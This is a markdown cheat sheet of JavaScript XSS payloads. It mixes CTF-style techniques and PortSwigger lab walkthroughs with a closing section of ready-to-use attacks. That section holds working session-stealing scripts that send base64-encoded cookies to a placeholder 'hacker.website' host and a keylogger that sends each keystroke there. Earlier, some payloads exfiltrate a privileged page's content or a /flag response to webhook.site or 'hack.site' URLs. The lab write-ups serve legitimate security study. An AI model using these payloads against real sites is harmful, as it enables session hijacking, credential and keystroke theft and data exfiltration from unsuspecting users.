# JavaScript based Payloads

## Basic test payloads

```html
<img src=x onerror=alert(document.domain)>

<script>document.write(123)</script>

```

## Interesting Techniques 


### Technique 1 
>#### Fetch-free technique to obtain a privileged page's content


```html 
<form method="post" id="theForm" action="/flag" target='hacker'>
    <!-- Form body here -->
</form>
<script> 
    let w = window.open('','hacker'); 	
    // w can be accessed as long as same-origin policy is satisfied
    
    document.getElementById('theForm').submit();
    
    setTimeout(()=>{
        document.location= `https://webhook.site/645c63<something>5-a172-a9014e389741?c=${w.document.body.innerHTML}`
    },500);

</script>

```

### Technique 2 
>#### Using quotes and comments to swallow existing content and to achieve XSS


```js
// Server-side code for a To-Do list creation feature with limitations on both individual line size and the entire list size 

const parsed = list
    .trim()
    .split("\n")
    .map((x) => x.trim());
if (parsed.length > 20) {
    res.status(400).send("list must have at most 20 items");
    return;
}
if (parsed.some((x) => x.length > 12)) {
    res.status(400).send("list items must not exceed 12 characters");
    return;
}

// The created list can be accessed as a checkbox list in a HTML file 

```

```html
<!-- Original Payload -->

 <img src=''onerror='fetch("/flag").then(r=> r.text() ).then( t=> window.open("http:"+"//hack"+".site"+"/"+t))'>

 <!-- Modified Payload to satisfy the length requirements -->

<img src='
'onerror='/*
*/fetch("/*
*//flag")./*
*/then(r=>/*
*/r.text()/*
*/).then(/*
*/t=>/*
*/window/*
*/.open(/*
*/"http:"+/* 
*/"//hack"/*
*/+".site/*
*/"+"/"/*
*/+t))'>

<!-- The ' (quote) after the src attritube and the ' before onerror would engulf the in between junk html as an img src and would throw an error.-->

<!-- Anything within the quotes of onerror attritube would be considered as js code. So to omit the junk html associated with each line in the list, comments (/**/) are used. -->

```

### Techniques learnt on PortSwigger Labs

>#### DOM XSS in document.write sink using source location.search
>
> - *General Thought process for XSS (pretending it to be a black box test)* 
> - A "search" text box to search for blogs is present.
> - The text entered in the text box is returned back in the Server's response and gives a semblance of *reflected XSS*. But it isn't possible in reality as the characters such as `'` and `"` are represented using HTML entities.
> - So, must look for the `document.write` sink as the question suggests. 

Spotted the sink in the HTML code:

```html
<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }
</script>
```
```bash
# First, the 'search' parameter from the query string in URL is extracted and stored in the variable 'query'.

# The variable 'query' is passed to the function 'trackSearch' which uses document.write() (the sink) to write a piece of HTML code to the page which includes the contents of the variable 'query' facilitating DOM based XSS
```

Test Payload :

`/?search=hello"world`

```html
<!-- O/p -->

<img src="/resources/images/tracker.gif?searchTerms=hello" world"="">

<!-- The payload worked! (despite the wierd addition of a SPACE character before the word 'world'; might be a browser thing, not sure) -->
```

XSS Payload : 

`/?search="><img+src%3dx+onerror%3dalert('XSS!')>`

```html
<!-- O/p -->

<img src="/resources/images/tracker.gif?searchTerms=">
<img src="x" onerror="alert('XSS!')">

<!-- The payload worked! (despite the wierd addition of "" (quotes) for the attributes' values of the second "img" tag which wasn't originally present in the payload; might be a browser thing, not sure) -->
```

>#### DOM XSS in jQuery anchor href attribute sink using location.search source

The Vulnerable Code :

`/feedback?returnPath=/`

```html
<div class="is-linkback">
    <a id="backLink" href="/">Back</a>
</div>
<script>
    $(function() {
        $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
    });
</script>                 
```

**Initial Payload** (Attempted to break out of the "" (quotes) of the anchor tag's href attribute to introduce a malicious img tag):

`/feedback?returnPath=/">Back</a><img+src%3dx+onerror%3dalert(document.cookie)>"`

```html
<!-- Learnt that it is not possible to break out of the "" (quotes) of an anchor tag's href attribute in jQuery as both the injected quotes got replaced to the corresponding HTML entity.-->

<a id="backLink" href="/&quot;>Back</a><img src=x onerror=alert(document.cookie)>&quot;">Back</a>

```

**Final Payload** :

`/feedback?returnPath=javascript:alert(document.cookie)`

```html
<!-- The alert() is called upon a click on the <a> tag. -->

<a id="backLink" href="javascript:alert(document.cookie)">Back</a>
```

---

> #### DOM XSS in jQuery selector sink using a hashchange event


**The vulnerable code :**

```html
<script src="/resources/js/jquery_1-8-2.js"></script>
<script src="/resources/js/jqueryMigrate_1-4-1.js"></script>
<script>
    $(window).on('hashchange', function(){
        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
        if (post) post.get(0).scrollIntoView();
    });
</script>
```

**Functionality :**

```
# The above code fires a function when the string following the hash symbol in the URL changes.

# The function first extracts the string following the hash and places it in the contains() method. Therefore the 'post' variable will have an object containing a list of h2 elements (within the section element with a class name of 'blog-list') that have the extracted string in its text content.

# Next, the 'if' condition checks if the post variable has any data assigned by the jQuery selector in the previous line. If yes, the code initiates a scroll to the first element in the list within the post variable (Fun fact: the jQuery selector in question always returns an Object irrespective of the number of matched h2 elements).

# So visiting /#No%20Silly will scroll down to <h2>No Silly Names, Please</h2> within <section class="blog-list">                    
```

**Vulnerability :**

Since an older version of jQuery is being used here, the `contains` method allowes to create an arbitrary DOM element. The created element is actually detached from the main DOM tree and is not rendered in the main page. But the creation of an `img` element (*even a detached one from the main DOM tree*) with a `src` attribute set **will make the browser attempt to fetch the image from the specified source**. We can utilize this mechanism to trigger an error and get an XSS.

**Initial Payload (for XSS) :**

Entered the following at the end of the URL and successfully got the `alert` box: 

`/#%3Cimg%20src=x%20onerror=alert(%22XSS%22)%3E`

**Final Payload (for solving the lab) :**

- Visited the exploit server and entered the following in the Body section:

 `<iframe src="https[:]//0a6800c704f3764e80c9b29c009d0023.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`

- The above payload will load the `iframe` from the specified source. Once the page is loaded in the iframe, the `onload` attribute will update the `src` attribute to include the previously crafted XSS payload to trigger the `print()`. This **will initiate a print action in the Victim's browser** to print the web page.

---

> #### Reflected XSS into attribute with angle brackets HTML-encoded

- Found a search box and submitted `<h1>hello</h1>` as an input.

- The input string got reflected in the response at two places:

```html
<!-- First Occurrence -->

<h1>0 search results for '&lt;h1&gt;hello&lt;/h1&gt;'</h1>

<!-- Second Occurrence -->

<input type=text placeholder='Search the blog...' name=search value="&lt;h1&gt;hello&lt;/h1&gt;">
```

- Next, introduced a **double quote** in the payload to check the outcome.

```html
<!-- O/p -->

<h1>0 search results for '&quot;&lt;h1&gt;hello&lt;/h1&gt;'</h1>

<input type=text placeholder='Search the blog...' name=search value=""&lt;h1&gt;hello&lt;/h1&gt;">

```

- It can be seen from the above O/p that although the angular brackets got replaced by HTML entities in both the loactions, the double quote got replaced by its HTML entity only inside the `h1` element.

- This lack of conversion of `"` to its HTML entity inside the `input` element could be exploited for XSS.


`/?search="+onmouseover%3d"alert('XSS!')`

- This payload will help create an `alert` dialog box whenever a user hovers the mouse pointer over the input box.

```html
<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert('XSS!')">
```

## Common XSS Payloads


### Session Stealing

```html
<script>fetch('https[:]//hacker.website/steal?cookie=' + btoa(document.cookie));</script> 

<script>var i = new Image(); i.src='http[:]//hacker.website:8000/?cookie='+btoa(document.cookie);</script>

<!-- NOTE: Don't forget to decode the base64 encoded cookie before using it in a request-->
```

### Key Logger

```html
<script>document.onkeypress = function(e) { fetch('https[:]//hacker.website/log?key=' + btoa(e.key) );}</script>
```
